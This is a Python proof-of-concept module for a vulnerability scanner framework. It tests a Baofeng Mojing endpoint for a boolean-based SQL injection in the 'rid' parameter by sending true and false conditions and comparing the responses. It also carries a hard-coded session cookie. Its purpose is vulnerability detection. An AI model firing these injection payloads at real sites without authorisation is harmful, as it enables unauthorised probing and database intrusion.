# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Mojing_0103'  # 平台漏洞编号
    name = '暴风魔镜登录存在SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-18'  # 漏洞公布时间
    desc = '''
    暴风魔镜登录存在SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=204960
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mojing'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5a569c8c-d5cf-4cea-aa0d-f099a5533f02'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/List/vr/praise/"
            payload = "rid=660' AND '996'='996&praise=0&resource_type=3"
            payload1 = "rid=660' AND '996'='997&praise=0&resource_type=3"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Length": "32",
                "Cookie": "Hm_lvt_cc8bbd8fb148ffc25a2c9c951dd43040=1462336535; Hm_lpvt_cc8bbd8fb148ffc25a2c9c951dd43040=1462342590; nTalk_CACHE_DATA={uid:kf_9686_ISME9754_3971414470516277,tid:1462336535057720}; NTKF_T2D_CLIENTID=guest31BD2928-36A8-EE57-E997-755687CC4B1E; user_regist_plat=1; PHPSESSID=f4seia83q3qpjjgsc3r037reb6; Hm_lvt_4f15bce7f77b74e9932fc896a915f5b8=1462344105; Hm_lpvt_4f15bce7f77b74e9932fc896a915f5b8=1462344113",
                "Connection": "close"
            }
            _response = requests.post(url, data=payload, headers=headers)
            _response1 = requests.post(url, data=payload1, headers=headers)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
